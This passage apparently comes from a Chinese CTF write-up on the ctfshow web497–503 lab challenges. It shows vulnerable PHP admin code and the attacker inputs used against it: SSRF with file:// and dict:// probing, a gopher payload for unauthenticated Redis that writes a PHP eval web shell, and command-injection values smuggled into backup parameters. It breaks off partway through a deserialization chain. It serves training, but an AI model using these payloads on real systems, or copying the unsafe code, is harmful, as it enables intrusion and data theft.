class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201803657.png" alt="image-20220413201803657"></p><p>找到一个修改头像,试试ssrf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201900968.png" alt="image-20220413201900968"></p><p>使用file协议读取文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203537687.png" alt="image-20220413203537687"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203611392.png" alt="image-20220413203611392"></p><h1 id="web498"><a href="#web498" class="headerlink" title="web498"></a>web498</h1><p>这次发现flag文件读不成了,但是ssrf还在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413204553495.png" alt="image-20220413204553495"></p><p>我们使用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//127.0.0.1:80</span></span><br></pre></td></tr></table></figure><p>来探测一下本地端口</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205251454.png" alt="image-20220413205251454"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205320503.png" alt="image-20220413205320503"></p><p>发现6379端口开着,试试ssrf打无密码redis</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br><span class="line">php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zf&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205531082.png" alt="image-20220413205531082"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27zf%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210540856.png" alt="image-20220413210540856"></p><h1 id="web499"><a href="#web499" class="headerlink" title="web499"></a>web499</h1><p>这次多了一个settings.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210943926.png" alt="image-20220413210943926"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:03:19</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings.php&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings.php&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212004560.png" alt="image-20220413212004560"></p><p>简单写个一句话,写到了’_<em>DIR</em>_.’&#x2F;..&#x2F;config&#x2F;settings.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212112902.png" alt="image-20220413212112902"></p><h1 id="web500"><a href="#web500" class="headerlink" title="web500"></a>web500</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212450700.png" alt="image-20220413212450700"></p><p>这次多了一个数据库备份</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212901748.png" alt="image-20220413212901748"></p><p>找到一个备份地址</p><p>api&#x2F;admin_db_backup.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 19:17:07</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="variable">$db_path</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="variable">$db_path</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;cp /f* /<span class="keyword">var</span>/www/html/zf.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215811269.png" alt="image-20220413215811269"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215857742.png" alt="image-20220413215857742"></p><h1 id="web501"><a href="#web501" class="headerlink" title="web501"></a>web501</h1><p>api&#x2F;admin_db_backup.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-17 14:39:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^zip|tar|sql$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$db_format</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">db_format=tar; cp /f* /<span class="keyword">var</span>/www/html/zf.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220821778.png" alt="image-20220413220821778"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220833082.png" alt="image-20220413220833082"></p><h1 id="web502"><a href="#web502" class="headerlink" title="web502"></a>web502</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-18 22:15:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pre</span>=<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;/db.&#x27;</span>;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(zip|tar|sql)$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="variable">$pre</span>.<span class="variable">$db_format</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这不是顾头不顾腚吗</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">l; cp /f* /<span class="keyword">var</span>/www/html/zf.txt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221724286.png" alt="image-20220413221724286"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221731992.png" alt="image-20220413221731992"></p><h1 id="web503"><a href="#web503" class="headerlink" title="web503"></a>web503</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-18 22:15:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pre</span>=<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;/db.&#x27;</span>;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(zip|tar|sql)$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413222608356.png" alt="image-20220413222608356"></p><p>又找到一个好东西</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-18 21:53:13</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-18 22:11:18</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$arr</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/png&quot;</span> ) &amp;&amp; <span class="variable">$arr</span>[<span class="string">&quot;size&quot;</span>]&lt;<span class="number">10241000</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line"><span class="variable">$basename</span> = <span class="string">&quot;../img/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$basename</span>);</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;logo&#x27;</span>]=<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这不是来了吗,有一个file_exists($pre.$db_format),还有文件上传.并且这里面的参数还可控</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span 